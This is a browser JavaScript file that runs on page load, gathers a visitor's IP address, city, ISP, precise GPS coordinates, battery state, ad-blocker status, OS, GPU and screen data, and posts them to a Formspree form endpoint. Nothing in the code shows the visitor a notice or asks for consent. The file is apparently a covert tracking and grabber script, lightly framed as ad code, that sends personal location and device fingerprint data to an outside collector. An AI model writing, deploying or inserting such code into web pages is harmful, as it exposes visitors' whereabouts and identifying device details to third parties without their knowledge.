
let canRunAds = true;

function detectAndroidVersion() {
    const ua = navigator.userAgent;
    const match = ua.match(/Android\s([0-9\.]+)/i);
    return match ? "Android " + match[1] : "Not Android";
}

function getOS() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) return "Android";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if (/Windows Phone/i.test(ua)) return "Windows Phone";
    if (ua.includes("Windows NT")) return "Windows";
    if (ua.includes("Mac OS")) return "MacOS";
    if (ua.includes("CrOS")) return "ChromeOS";
    if (ua.includes("Linux")) return "Linux";
    return "Unknown OS";
}

function getGPU() {
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return "Unavailable";
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic WebGL";
    } catch (e) {
        return "Blocked/Unavailable";
    }
}

async function getIPData() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();
        return {
            ip: data.ip || "Unavailable",
            country: data.country_name || "Unavailable",
            city: data.city || "Unknown",
            org: data.org || "Unavailable"
        };
    } catch (error) {
        return { ip: "Blocked", country: "Error", city: "", org: "Error" };
    }
}

async function getGPS() {
    return new Promise(resolve => {
        if (!navigator.geolocation) {
            resolve({ lat: "Not Supported", lon: "Not Supported" });
            return;
        }
        navigator.geolocation.getCurrentPosition(
            pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
            err => resolve({ lat: "Denied/Error", lon: "Denied/Error" }),
            { timeout: 5000 }
        );
    });
}

async function getBatteryInfo() {
    try {
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            return { level: Math.round(bat.level * 100) + "%", charging: bat.charging };
        }
        return "Not Supported";
    } catch (e) {
        return "Blocked";
    }
}

async function checkAdBlocker() {
    return new Promise(resolve => {
        const testAd = document.createElement('div');
        testAd.innerHTML = '&nbsp;';
        testAd.className = 'adsbox'; 
        testAd.style.position = 'absolute';
        testAd.style.left = '-999px';
        document.body.appendChild(testAd);

        window.setTimeout(() => {
            const isBlocked = testAd.offsetHeight === 0;
            testAd.remove();
            resolve(isBlocked ? "Enabled" : "Disabled");
        }, 150);
    });
}

async function collect() {
    const [ipData, gps, battery, adBlockStatus] = await Promise.all([
        getIPData(),
        getGPS(),
        getBatteryInfo(),
        checkAdBlocker()
    ]);

    const currentOS = getOS();

    return {
        TIME: new Date().toLocaleString(),
        IP: ipData.ip,
        LOCATION: `${ipData.city}, ${ipData.country}`,
        ISP: ipData.org,
        GPS_LAT: gps.lat,
        GPS_LON: gps.lon,
        BATTERY: battery,
        AD_BLOCKER: adBlockStatus,
        OS: currentOS,
        ANDROID_VER: detectAndroidVersion(),
        SCREEN: `${window.screen.width}x${window.screen.height}`,
        GPU: getGPU(),
        LANGUAGE: navigator.language,
        REFERRER: document.referrer || "Direct"
    };
}

async function sendData() {
    const data = await collect();
    console.log("Data Collected:", data); // Helpful for debugging

    try {
        const response = await fetch("https://formspree.io/f/maqpoaly", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
        if (response.ok) {
            console.log("Submission successful");
        }
    } catch (e) {
        console.error("Transmission failed");
    }
}

window.addEventListener('load', sendData);
